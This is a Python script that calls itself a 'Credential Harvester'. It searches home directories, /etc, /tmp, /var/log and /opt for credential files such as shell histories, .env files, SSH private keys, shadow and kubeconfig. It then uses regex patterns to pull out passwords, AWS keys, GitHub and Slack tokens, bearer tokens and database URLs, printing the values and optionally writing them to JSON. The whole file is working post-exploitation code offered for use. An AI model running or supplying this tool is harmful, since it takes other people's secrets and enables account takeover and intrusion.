#!/usr/bin/env python3
"""Credential harvester using only Python stdlib.
Searches filesystem for credentials, keys, tokens, and sensitive files."""
import os
import sys
import re
import json
import argparse
import hashlib
from pathlib import Path

# Paths to search for credentials
SEARCH_PATHS = [
    Path.home(),
    Path('/etc'),
    Path('/tmp'),
    Path('/var/log'),
    Path('/opt'),
]

# File patterns that likely contain credentials
SENSITIVE_FILES = [
    '.bash_history', '.zsh_history', '.mysql_history', '.psql_history',
    '.git-credentials', '.netrc', '.pgpass', '.my.cnf', '.s3cfg',
    'credentials', 'credentials.json', 'config.json', 'secrets.json',
    '.env', '.env.local', '.env.production',
    'id_rsa', 'id_ed25519', 'id_ecdsa', 'authorized_keys',
    'shadow', 'passwd',
    'wp-config.php', 'database.yml', 'settings.py',
    'kubeconfig', '.kube/config',
    'token', 'access_token', 'refresh_token',
]

# Regex patterns for in-file credential detection
CRED_PATTERNS = [
    (r'(?:password|passwd|pwd|pass)[\s:=]+["\']?([^\s"\',;]{4,50})', 'password'),
    (r'(?:api[_-]?key|apikey|api[_-]?token)[\s:=]+["\']?([a-zA-Z0-9_\-]{16,})', 'api_key'),
    (r'(?:secret[_-]?key|secret)[\s:=]+["\']?([a-zA-Z0-9_\-/+=]{16,})', 'secret_key'),
    (r'(?:aws_access_key_id)[\s:=]+["\']?(AKIA[A-Z0-9]{16})', 'aws_access_key'),
    (r'(?:aws_secret_access_key)[\s:=]+["\']?([a-zA-Z0-9/+=]{40})', 'aws_secret_key'),
    (r'(?:GITHUB_TOKEN|github_token|gh_token)[\s:=]+["\']?(gh[ps]_[a-zA-Z0-9]{36,})', 'github_token'),
    (r'(-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----)', 'private_key'),
    (r'(?:mysql|postgres|redis)://([^\s"]+)', 'database_url'),
    (r'Bearer\s+([a-zA-Z0-9_\-.~+/]+=*)', 'bearer_token'),
    (r'(?:slack[_-]?(?:token|webhook))[\s:=]+["\']?(xox[bpsar]-[a-zA-Z0-9\-]+)', 'slack_token'),
]

def find_sensitive_files(search_paths, max_depth=4):
    """Walk filesystem looking for sensitive files."""
    found = []
    for base in search_paths:
        if not base.exists():
            continue
        try:
            for root, dirs, files in os.walk(str(base)):
                depth = str(root).count(os.sep) - str(base).count(os.sep)
                if depth > max_depth:
                    dirs.clear()
                    continue
                for fname in files:
                    if fname in SENSITIVE_FILES or any(fname.endswith(ext) for ext in ['.pem', '.key', '.p12', '.pfx', '.jks']):
                        fpath = Path(root) / fname
                        try:
                            stat = fpath.stat()
                            found.append({
                                'path': str(fpath),
                                'name': fname,
                                'size': stat.st_size,
                                'readable': os.access(str(fpath), os.R_OK),
                            })
                        except (PermissionError, OSError):
                            pass
        except PermissionError:
            pass
    return found

def scan_file_for_creds(filepath, max_size=1024*1024):
    """Scan a file's contents for credential patterns."""
    creds = []
    try:
        size = os.path.getsize(filepath)
        if size > max_size or size == 0:
            return creds
        with open(filepath, 'r', errors='replace') as f:
            content = f.read(max_size)
        for pattern, cred_type in CRED_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                value = match.group(1)
                if len(value) > 3 and not all(c == '*' for c in value):
                    creds.append({
                        'type': cred_type,
                        'value': value[:80],
                        'file': filepath,
                        'line': content[:match.start()].count('\n') + 1,
                    })
    except (PermissionError, OSError, UnicodeDecodeError):
        pass
    return creds

def discover_ssh_keys(home=None):
    """Find SSH keys in standard locations."""
    if home is None:
        home = Path.home()
    ssh_dir = home / '.ssh'
    keys = []
    if ssh_dir.exists():
        for f in ssh_dir.iterdir():
            try:
                content = f.read_text(errors='replace')[:100]
                if 'PRIVATE KEY' in content:
                    keys.append({'path': str(f), 'type': 'private_key', 'encrypted': 'ENCRYPTED' in content})
                elif f.name == 'authorized_keys':
                    line_count = content.count('\n') + 1
                    keys.append({'path': str(f), 'type': 'authorized_keys', 'entries': line_count})
                elif f.name == 'known_hosts':
                    keys.append({'path': str(f), 'type': 'known_hosts'})
            except (PermissionError, OSError):
                pass
    return keys

def main():
    parser = argparse.ArgumentParser(description='Credential Harvester (stdlib)')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Max search depth')
    parser.add_argument('-o', '--output', default=None, help='JSON output file')
    parser.add_argument('-q', '--quiet', action='store_true')
    args = parser.parse_args()
    print('[*] Credential Harvester (stdlib only)')
    results = {'sensitive_files': [], 'credentials': [], 'ssh_keys': []}
    print('[*] Searching for sensitive files...')
    results['sensitive_files'] = find_sensitive_files(SEARCH_PATHS, args.depth)
    print(f'  Found {len(results["sensitive_files"])} sensitive files')
    print('[*] Scanning files for credentials...')
    for finfo in results['sensitive_files']:
        if finfo['readable']:
            creds = scan_file_for_creds(finfo['path'])
            results['credentials'].extend(creds)
    print(f'  Found {len(results["credentials"])} credentials')
    print('[*] Checking SSH keys...')
    results['ssh_keys'] = discover_ssh_keys()
    print(f'  Found {len(results["ssh_keys"])} SSH key files')
    if not args.quiet:
        for c in results['credentials']:
            print(f'  [+] {c["type"]}: {c["value"][:40]}... ({c["file"]}:{c["line"]})')
        for k in results['ssh_keys']:
            enc = ' (encrypted)' if k.get('encrypted') else ''
            print(f'  [+] {k["type"]}: {k["path"]}{enc}')
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f'[*] Saved to {args.output}')
    print(f'\n[*] Summary: {len(results["sensitive_files"])} files, {len(results["credentials"])} creds, {len(results["ssh_keys"])} keys')

if __name__ == '__main__':
    main()

